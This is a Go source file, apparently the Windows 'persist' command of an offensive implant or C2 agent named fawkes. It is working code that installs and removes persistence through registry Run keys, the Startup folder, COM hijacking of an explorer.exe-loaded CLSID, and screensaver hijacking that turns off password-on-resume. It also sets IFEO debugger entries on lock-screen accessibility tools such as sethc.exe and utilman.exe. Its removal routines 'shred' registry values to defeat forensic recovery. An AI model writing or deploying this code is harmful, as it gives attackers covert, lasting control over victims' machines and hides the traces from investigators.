//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method  string `json:"method"`
	Action  string `json:"action"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Hive    string `json:"hive"`
	CLSID   string `json:"clsid"`
	Timeout string `json:"timeout"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	var args persistArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (method, action, name, path)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "registry", "reg-run":
		return persistRegistryRun(args)
	case "startup-folder", "startup":
		return persistStartupFolder(args)
	case "com-hijack":
		return persistCOMHijack(args)
	case "screensaver":
		return persistScreensaver(args)
	case "ifeo":
		return persistIFEO(args)
	case "list":
		return listPersistence(args)
	default:
		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method)
	}
}

// persistRegistryRun adds/removes a registry Run key entry
func persistRegistryRun(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for registry persistence")
	}

	// Determine hive — default to HKCU (doesn't need admin)
	hive := strings.ToUpper(args.Hive)
	if hive == "" {
		hive = "HKCU"
	}

	var hiveKey registry.Key
	var regPath string
	switch hive {
	case "HKCU":
		hiveKey = registry.CURRENT_USER
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	case "HKLM":
		hiveKey = registry.LOCAL_MACHINE
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	default:
		return errorf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive)
	}

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			// Default to current executable
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue(args.Name, args.Path); err != nil {
			return errorf("Error writing registry value: %v", err)
		}

		return successf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path)

	case "remove":
		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		// Shred value before deletion to defeat forensic registry recovery
		shredRegistryValue(key, args.Name)

		return successf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// persistStartupFolder copies a file to the user's Startup folder
func persistStartupFolder(args persistArgs) structs.CommandResult {
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		if args.Name == "" {
			args.Name = filepath.Base(args.Path)
		}

		destPath := filepath.Join(startupDir, args.Name)

		// Copy the file to the startup folder
		src, err := os.Open(args.Path)
		if err != nil {
			return errorf("Error opening source '%s': %v", args.Path, err)
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return errorf("Error creating '%s': %v", destPath, err)
		}
		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return errorf("Error copying file: %v", err)
		}

		if err := dst.Close(); err != nil {
			return errorf("Error finalizing destination file: %v", err)
		}

		return successf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes)

	case "remove":
		if args.Name == "" {
			return errorResult("Error: name is required to remove startup folder entry")
		}

		destPath := filepath.Join(startupDir, args.Name)
		secureRemove(destPath)
		if _, err := os.Stat(destPath); err == nil {
			return errorf("Error removing '%s': file still exists", destPath)
		}

		return successf("Removed startup folder entry: %s", destPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// listPersistence lists known persistence entries
func listPersistence(args persistArgs) structs.CommandResult {
	var lines []string
	lines = append(lines, "=== Persistence Entries ===\n")

	// Check HKCU Run
	lines = append(lines, "--- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.CURRENT_USER); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check HKLM Run
	lines = append(lines, "--- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.LOCAL_MACHINE); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check Startup folder
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lines = append(lines, fmt.Sprintf("--- Startup Folder: %s ---", startupDir))
	entries, err := os.ReadDir(startupDir)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else if len(entries) == 0 {
		lines = append(lines, "  (empty)")
	} else {
		for _, e := range entries {
			info, _ := e.Info()
			size := int64(0)
			if info != nil {
				size = info.Size()
			}
			lines = append(lines, fmt.Sprintf("  %s (%d bytes)", e.Name(), size))
		}
	}
	lines = append(lines, "")

	// Check COM Hijacking (known CLSIDs)
	lines = append(lines, "--- COM Hijacking (HKCU InprocServer32 overrides) ---")
	knownCLSIDs := [][2]string{
		{"{42aedc87-2188-41fd-b9a3-0c966feabec1}", "MruPidlList (explorer.exe)"},
		{"{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDeviceEnumerator (audio apps)"},
		{"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}", "CAccPropServicesClass (accessibility)"},
		{"{fbeb8a05-beee-4442-804e-409d6c4515e9}", "ShellFolderViewOC (explorer.exe)"},
	}
	comFound := false
	for _, clsidInfo := range knownCLSIDs {
		keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsidInfo[0])
		key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE)
		if err == nil {
			val, _, err := key.GetStringValue("")
			key.Close()
			if err == nil {
				lines = append(lines, fmt.Sprintf("  %s  %s = %s", clsidInfo[0], clsidInfo[1], val))
				comFound = true
			}
		}
	}
	if !comFound {
		lines = append(lines, "  (none detected)")
	}
	lines = append(lines, "")

	// Check IFEO Debugger entries
	lines = append(lines, "--- IFEO Debugger (HKLM\\...\\Image File Execution Options) ---")
	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	ifeoFound := false
	for _, target := range ifeoTargets {
		keyPath := ifeoBasePath + `\` + target[0]
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.QUERY_VALUE)
		if err == nil {
			debugger, _, err := key.GetStringValue("Debugger")
			key.Close()
			if err == nil && debugger != "" {
				lines = append(lines, fmt.Sprintf("  %s  %s → %s", target[0], target[1], debugger))
				ifeoFound = true
			}
		}
	}
	if !ifeoFound {
		lines = append(lines, "  (none detected)")
	}
	lines = append(lines, "")

	// Check Screensaver hijacking
	lines = append(lines, "--- Screensaver (HKCU\\Control Panel\\Desktop) ---")
	desktopKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else {
		scrnsave, _, scrErr := desktopKey.GetStringValue("SCRNSAVE.EXE")
		active, _, actErr := desktopKey.GetStringValue("ScreenSaveActive")
		timeout, _, _ := desktopKey.GetStringValue("ScreenSaveTimeout")
		desktopKey.Close()
		if scrErr == nil && scrnsave != "" {
			activeStr := "Unknown"
			if actErr == nil {
				if active == "1" {
					activeStr = "Yes"
				} else {
					activeStr = "No"
				}
			}
			lines = append(lines, fmt.Sprintf("  SCRNSAVE.EXE    = %s", scrnsave))
			lines = append(lines, fmt.Sprintf("  ScreenSaveActive = %s (%s)", active, activeStr))
			if timeout != "" {
				lines = append(lines, fmt.Sprintf("  ScreenSaveTimeout = %s seconds", timeout))
			}
		} else {
			lines = append(lines, "  (no screensaver configured)")
		}
	}

	return structs.CommandResult{
		Output:    strings.Join(lines, "\n"),
		Status:    "success",
		Completed: true,
	}
}

// defaultCLSID is MruPidlList — loaded by explorer.exe at shell startup, highly reliable.
const defaultCLSID = "{42aedc87-2188-41fd-b9a3-0c966feabec1}"

// persistCOMHijack installs/removes COM hijacking persistence via HKCU InprocServer32 override
func persistCOMHijack(args persistArgs) structs.CommandResult {
	if args.Path == "" && args.Action == "install" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		args.Path = exe
	}

	clsid := args.CLSID
	if clsid == "" {
		clsid = defaultCLSID
	}
	// Normalize CLSID — ensure it has braces
	if !strings.HasPrefix(clsid, "{") {
		clsid = "{" + clsid + "}"
	}

	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)

	switch strings.ToLower(args.Action) {
	case "install":
		key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error creating HKCU\\%s: %v", keyPath, err)
		}
		defer key.Close()

		// Set (Default) value to our DLL/EXE path
		if err := key.SetStringValue("", args.Path); err != nil {
			return errorf("Error setting DLL path: %v", err)
		}

		// Set ThreadingModel (required for InprocServer32 to be used)
		if err := key.SetStringValue("ThreadingModel", "Both"); err != nil {
			return errorf("Error setting ThreadingModel: %v", err)
		}

		return successf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path)

	case "remove":
		// Shred values then delete InprocServer32 key, then the CLSID key
		shredRegistryKey(registry.CURRENT_USER, keyPath)

		parentPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)

		return successf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// persistScreensaver installs/removes screensaver hijacking persistence
func persistScreensaver(args persistArgs) structs.CommandResult {
	desktopKeyPath := `Control Panel\Desktop`

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		timeout := args.Timeout
		if timeout == "" {
			timeout = "60" // 60 seconds idle before screensaver triggers
		}

		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
		}
		defer key.Close()

		// Set SCRNSAVE.EXE to our payload
		if err := key.SetStringValue("SCRNSAVE.EXE", args.Path); err != nil {
			return errorf("Error setting SCRNSAVE.EXE: %v", err)
		}

		// Enable screensaver
		if err := key.SetStringValue("ScreenSaveActive", "1"); err != nil {
			return errorf("Error setting ScreenSaveActive: %v", err)
		}

		// Set idle timeout
		if err := key.SetStringValue("ScreenSaveTimeout", timeout); err != nil {
			return errorf("Error setting ScreenSaveTimeout: %v", err)
		}

		// Disable password on resume (avoids locking user out)
		if err := key.SetStringValue("ScreenSaverIsSecure", "0"); err != nil {
			return errorf("Error setting ScreenSaverIsSecure: %v", err)
		}

		return successf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout)

	case "remove":
		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
		}
		defer key.Close()

		// Shred the screensaver executable path before deletion
		shredRegistryValue(key, "SCRNSAVE.EXE")
		// Disable screensaver
		_ = key.SetStringValue("ScreenSaveActive", "0")

		return structs.CommandResult{
			Output:    fmt.Sprintf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
			Status:    "success",
			Completed: true,
		}

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// ifeoTargets are common IFEO targets accessible from the Windows lock screen.
var ifeoTargets = [][2]string{
	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
	{"utilman.exe", "Ease of Access (lock screen button)"},
	{"osk.exe", "On-Screen Keyboard"},
	{"narrator.exe", "Narrator"},
	{"magnify.exe", "Magnifier"},
}

// persistIFEO installs/removes Image File Execution Options debugger persistence (T1546.012).
// When the target executable is launched, Windows runs the debugger binary instead.
func persistIFEO(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)")
	}

	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	keyPath := ifeoBasePath + `\` + args.Name

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue("Debugger", args.Path); err != nil {
			return errorf("Error setting Debugger value: %v", err)
		}

		// Identify the trigger for display
		trigger := "When " + args.Name + " is launched"
		for _, t := range ifeoTargets {
			if strings.EqualFold(args.Name, t[0]) {
				trigger = t[1]
				break
			}
		}

		return successf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger)

	case "remove":
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKLM\\%s: %v", keyPath, err)
		}
		defer key.Close()

		// Shred Debugger value before deletion to defeat forensic recovery
		shredRegistryValue(key, "Debugger")

		return successf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

func enumRunKey(hiveKey registry.Key) ([][2]string, error) {
	key, err := registry.OpenKey(hiveKey, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return nil, err
	}
	defer key.Close()

	names, err := key.ReadValueNames(-1)
	if err != nil {
		return nil, err
	}

	var entries [][2]string
	for _, name := range names {
		val, _, err := key.GetStringValue(name)
		if err != nil {
			val = "(error reading)"
		}
		entries = append(entries, [2]string{name, val})
	}
	return entries, nil
}
